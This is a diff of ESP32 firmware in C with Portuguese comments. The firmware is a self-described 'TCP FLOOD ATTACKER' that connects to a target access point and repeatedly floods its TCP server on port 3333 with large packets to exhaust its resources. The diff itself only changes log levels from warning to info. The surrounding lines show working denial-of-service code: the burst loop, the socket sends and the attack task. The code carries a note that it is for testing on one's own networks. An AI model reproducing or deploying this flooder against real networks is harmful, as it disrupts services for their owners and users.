@@ -50,9 +50,9 @@ static void event_handler(void* arg, esp_event_base_t event_base,
         esp_wifi_connect();
     } else if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_DISCONNECTED) {
         is_connected = false;
-        ESP_LOGW(TAG, "");
-        ESP_LOGW(TAG, "Desconectado do alvo!");
-        ESP_LOGW(TAG, "");
+        ESP_LOGI(TAG, "");
+        ESP_LOGI(TAG, "Desconectado do alvo!");
+        ESP_LOGI(TAG, "");
         
         // Tentar reconectar
         esp_wifi_connect();
@@ -96,15 +96,15 @@ void generate_tcp_flood_data(char* buffer, size_t size, int packet_num)
 void execute_tcp_flood_burst(void)
 {
     if (!is_connected) {
-        ESP_LOGW(TAG, "");
-        ESP_LOGW(TAG, "Nao conectado - nao e possivel fazer TCP flood");
-        ESP_LOGW(TAG, "");
+        ESP_LOGI(TAG, "");
+        ESP_LOGI(TAG, "Nao conectado - nao e possivel fazer TCP flood");
+        ESP_LOGI(TAG, "");
         return;
     }
 
-    ESP_LOGW(TAG, "");
-    ESP_LOGW(TAG, "EXECUTANDO TCP FLOOD BURST #%d", (packets_sent / PACKETS_PER_BURST) + 1);
-    ESP_LOGW(TAG, "Alvo: " IPSTR ":%d (Servidor TCP do AP)", IP2STR(&gateway_ip), TCP_SERVER_PORT);
+    ESP_LOGI(TAG, "");
+    ESP_LOGI(TAG, "EXECUTANDO TCP FLOOD BURST #%d", (packets_sent / PACKETS_PER_BURST) + 1);
+    ESP_LOGI(TAG, "Alvo: " IPSTR ":%d (Servidor TCP do AP)", IP2STR(&gateway_ip), TCP_SERVER_PORT);
 
     for (int i = 0; i < PACKETS_PER_BURST; i++) {
         struct sockaddr_in dest_addr;
@@ -132,7 +132,7 @@ void execute_tcp_flood_burst(void)
             
             int sent = send(sock, flood_data, strlen(flood_data), 0);
             if (sent > 0) {
-                ESP_LOGW(TAG, "TCP FLOOD #%d enviado (%d bytes) -> Servidor TCP do AP", 
+                ESP_LOGI(TAG, "TCP FLOOD #%d enviado (%d bytes) -> Servidor TCP do AP", 
                          packets_sent + i + 1, sent);
                 
                 // Tentar manter conexão aberta brevemente para consumir recursos
@@ -153,40 +153,40 @@ void execute_tcp_flood_burst(void)
     }
     
     packets_sent += PACKETS_PER_BURST;
-    ESP_LOGW(TAG, "TCP flood burst completo! Total enviado: %d", packets_sent);
-    ESP_LOGW(TAG, "");
+    ESP_LOGI(TAG, "TCP flood burst completo! Total enviado: %d", packets_sent);
+    ESP_LOGI(TAG, "");
 }
 
 // Função para mostrar estatísticas do TCP flood
 void show_flood_stats(void)
 {
-    ESP_LOGW(TAG, "");
-    ESP_LOGW(TAG, "");
-    ESP_LOGW(TAG, "=== ESTATISTICAS DO TCP FLOOD ===");
-    ESP_LOGW(TAG, "Alvo: %s (" IPSTR ":%d)", TARGET_SSID, IP2STR(&gateway_ip), TCP_SERVER_PORT);
-    ESP_LOGW(TAG, "Protocolo: TCP (servidor do AP)");
-    ESP_LOGW(TAG, "Pacotes TCP enviados: %d", packets_sent);
-    ESP_LOGW(TAG, "Conexoes falhadas: %d", packets_failed);
-    ESP_LOGW(TAG, "Taxa de sucesso: %.1f%%", 
+    ESP_LOGI(TAG, "");
+    ESP_LOGI(TAG, "");
+    ESP_LOGI(TAG, "=== ESTATISTICAS DO TCP FLOOD ===");
+    ESP_LOGI(TAG, "Alvo: %s (" IPSTR ":%d)", TARGET_SSID, IP2STR(&gateway_ip), TCP_SERVER_PORT);
+    ESP_LOGI(TAG, "Protocolo: TCP (servidor do AP)");
+    ESP_LOGI(TAG, "Pacotes TCP enviados: %d", packets_sent);
+    ESP_LOGI(TAG, "Conexoes falhadas: %d", packets_failed);
+    ESP_LOGI(TAG, "Taxa de sucesso: %.1f%%", 
              packets_sent > 0 ? (float)(packets_sent - packets_failed) / packets_sent * 100 : 0);
-    ESP_LOGW(TAG, "Taxa atual: ~%d conexoes/seg", 
+    ESP_LOGI(TAG, "Taxa atual: ~%d conexoes/seg", 
              (1000 / FLOOD_INTERVAL_MS) * PACKETS_PER_BURST);
-    ESP_LOGW(TAG, "Tamanho do pacote TCP: %d bytes", LARGE_PACKET_SIZE);
-    ESP_LOGW(TAG, "Status: %s", is_connected ? "CONECTADO" : "DESCONECTADO");
-    ESP_LOGW(TAG, "==========================================");
-    ESP_LOGW(TAG, "");
+    ESP_LOGI(TAG, "Tamanho do pacote TCP: %d bytes", LARGE_PACKET_SIZE);
+    ESP_LOGI(TAG, "Status: %s", is_connected ? "CONECTADO" : "DESCONECTADO");
+    ESP_LOGI(TAG, "==========================================");
+    ESP_LOGI(TAG, "");
 }
 
 // Task principal do ataque de TCP flood
 static void packet_flood_attack_task(void *pvParameters)
 {
-    ESP_LOGW(TAG, "INICIANDO TCP FLOOD ATTACK!");
-    ESP_LOGW(TAG, "Alvo: %s", TARGET_SSID);
-    ESP_LOGW(TAG, "Porta TCP alvo: %d (servidor do AP)", TCP_SERVER_PORT);
-    ESP_LOGW(TAG, "Intervalo: %d ms", FLOOD_INTERVAL_MS);
-    ESP_LOGW(TAG, "Conexoes TCP por rajada: %d", PACKETS_PER_BURST);
-    ESP_LOGW(TAG, "Maximo de pacotes TCP: %d", MAX_FLOOD_PACKETS);
-    ESP_LOGW(TAG, "Tamanho do pacote TCP: %d bytes", LARGE_PACKET_SIZE);
+    ESP_LOGI(TAG, "INICIANDO TCP FLOOD ATTACK!");
+    ESP_LOGI(TAG, "Alvo: %s", TARGET_SSID);
+    ESP_LOGI(TAG, "Porta TCP alvo: %d (servidor do AP)", TCP_SERVER_PORT);
+    ESP_LOGI(TAG, "Intervalo: %d ms", FLOOD_INTERVAL_MS);
+    ESP_LOGI(TAG, "Conexoes TCP por rajada: %d", PACKETS_PER_BURST);
+    ESP_LOGI(TAG, "Maximo de pacotes TCP: %d", MAX_FLOOD_PACKETS);
+    ESP_LOGI(TAG, "Tamanho do pacote TCP: %d bytes", LARGE_PACKET_SIZE);
     
     // Aguardar conexão inicial
     while (!is_connected) {
@@ -194,7 +194,7 @@ static void packet_flood_attack_task(void *pvParameters)
         vTaskDelay(pdMS_TO_TICKS(2000));
     }
     
-    ESP_LOGW(TAG, "Conectado! Iniciando TCP flood contra servidor do AP em 3 segundos...");
+    ESP_LOGI(TAG, "Conectado! Iniciando TCP flood contra servidor do AP em 3 segundos...");
     vTaskDelay(pdMS_TO_TICKS(3000));
     
     while (packets_sent < MAX_FLOOD_PACKETS && is_connected) {
@@ -210,9 +210,9 @@ static void packet_flood_attack_task(void *pvParameters)
         vTaskDelay(pdMS_TO_TICKS(FLOOD_INTERVAL_MS));
     }
     
-    ESP_LOGW(TAG, "");
-    ESP_LOGW(TAG, "TCP FLOOD ATTACK CONCLUIDO!");
-    ESP_LOGW(TAG, "");
+    ESP_LOGI(TAG, "");
+    ESP_LOGI(TAG, "TCP FLOOD ATTACK CONCLUIDO!");
+    ESP_LOGI(TAG, "");
     show_flood_stats();
     
     vTaskDelete(NULL);
@@ -275,14 +275,14 @@ void app_main(void)
     }
     ESP_ERROR_CHECK(ret);
 
-    ESP_LOGW(TAG, "");
-    ESP_LOGW(TAG, "");
-    ESP_LOGW(TAG, "=== TCP FLOOD ATTACKER INICIADO ===");
-    ESP_LOGW(TAG, "ATENCAO: Este programa executa TCP flood REAL!");
-    ESP_LOGW(TAG, "Ele ira sobrecarregar o servidor TCP do AP!");
-    ESP_LOGW(TAG, "Use apenas em redes proprias para teste!");
-    ESP_LOGW(TAG, "Preparando para atacar servidor TCP na porta 3333...");
-    ESP_LOGW(TAG, "");
+    ESP_LOGI(TAG, "");
+    ESP_LOGI(TAG, "");
+    ESP_LOGI(TAG, "=== TCP FLOOD ATTACKER INICIADO ===");
+    ESP_LOGI(TAG, "ATENCAO: Este programa executa TCP flood REAL!");
+    ESP_LOGI(TAG, "Ele ira sobrecarregar o servidor TCP do AP!");
+    ESP_LOGI(TAG, "Use apenas em redes proprias para teste!");
+    ESP_LOGI(TAG, "Preparando para atacar servidor TCP na porta 3333...");
+    ESP_LOGI(TAG, "");
     
     // Inicializar Wi-Fi
     wifi_init_packet_flooder();
@@ -293,7 +293,7 @@ void app_main(void)
     // Iniciar task de ataque de flood
     xTaskCreate(packet_flood_attack_task, "packet_flood_task", 8192, NULL, 5, NULL);
     
-    ESP_LOGW(TAG, "");
-    ESP_LOGW(TAG, "Sistema TCP flood ativo!");
-    ESP_LOGW(TAG, "");
+    ESP_LOGI(TAG, "");
+    ESP_LOGI(TAG, "Sistema TCP flood ativo!");
+    ESP_LOGI(TAG, "");
 }
